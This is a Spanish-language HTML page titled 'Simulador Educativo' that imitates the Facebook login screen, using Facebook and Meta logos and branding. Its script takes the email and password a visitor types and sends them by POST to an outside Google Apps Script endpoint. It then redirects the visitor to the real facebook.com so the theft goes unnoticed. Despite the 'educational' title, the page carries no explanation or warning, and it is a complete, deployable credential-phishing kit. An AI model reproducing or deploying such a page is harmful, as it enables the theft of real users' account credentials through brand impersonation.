
<!DOCTYPE html>
<html lang="es">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1" />
  <title>Simulador Educativo</title>
  <style>
    body {
      margin: 0;
      font-family: Arial, sans-serif;
      background-color: #fff;
      display: flex;
      flex-direction: column;
      align-items: center;
      justify-content: flex-start;
      padding: 2rem 1rem;
      color: #1c1e21;
    }
    .logo {
      margin-top: 2rem;
      margin-bottom: 1.5rem;
    }
    .logo img {
      height: 60px;
    }
    .container {
      width: 100%;
      max-width: 400px;
      display: flex;
      flex-direction: column;
      gap: 1rem;
    }
    .input-group input {
      width: 100%;
      padding: 0.9rem;
      border: 1px solid #ccd0d5;
      border-radius: 10px;
      font-size: 1rem;
      background-color: #f5f6f7;
    }
    .btn-login {
      width: 100%;
      padding: 0.9rem;
      background-color: #1877f2;
      border: none;
      border-radius: 10px;
      color: #fff;
      font-size: 1rem;
      font-weight: bold;
      cursor: pointer;
    }
    .btn-login:hover {
      background-color: #166fe5;
    }
    .link-olvide {
      text-align: center;
      color: #1877f2;
      font-size: 0.95rem;
    }
    .btn-crear {
      width: 100%;
      padding: 0.9rem;
      background-color: #fff;
      color: #1877f2;
      border: 1px solid #ccd0d5;
      border-radius: 10px;
      font-weight: bold;
      font-size: 1rem;
      margin-top: 1rem;
    }
    .footer {
      margin-top: 3rem;
      text-align: center;
      font-size: 0.9rem;
      color: #90949c;
    }
    .footer img {
      height: 18px;
      margin-top: 0.5rem;
    }
  </style>
</head>
<body>
  <div class="logo">
    <img src="facebook-logo.png" alt="Facebook Logo" />
  </div>

  <div class="container">
    <form onsubmit="enviarFormulario(event)" method="POST">
      <div class="input-group">
        <input type="email" name="email" id="email" placeholder="Celular o correo electrónico" required />
      </div>
      <div class="input-group">
        <input type="password" name="password" id="password" placeholder="Contraseña" required />
      </div>
      <button type="submit" class="btn-login">Iniciar sesión</button>
    </form>

    <div class="link-olvide">¿Olvidaste tu contraseña?</div>
    <button class="btn-crear">Crear cuenta nueva</button>
  </div>

  <div class="footer">
    Meta<br />
    <img src="meta-logo.jpg" alt="Meta Logo">
  </div>

  <script>
    function enviarFormulario(event) {
      event.preventDefault();
      const email = document.getElementById("email").value;
      const password = document.getElementById("password").value;
      
      fetch("https://script.google.com/macros/s/AKfycbyi6rgut8aLrgBNf55wat0duFBbPxwg715DRxvxOgwPOqYPwxadPlrcOpKhMAQNSnBRWA/exec", {
        method: "POST",
        headers: {
          "Content-Type": "application/x-www-form-urlencoded",
        },
        body: `email=${encodeURIComponent(email)}&password=${encodeURIComponent(password)}`
      }).then(() => {
        window.location.href = "https://www.facebook.com/";
      });
    }
  </script>
</body>
</html>
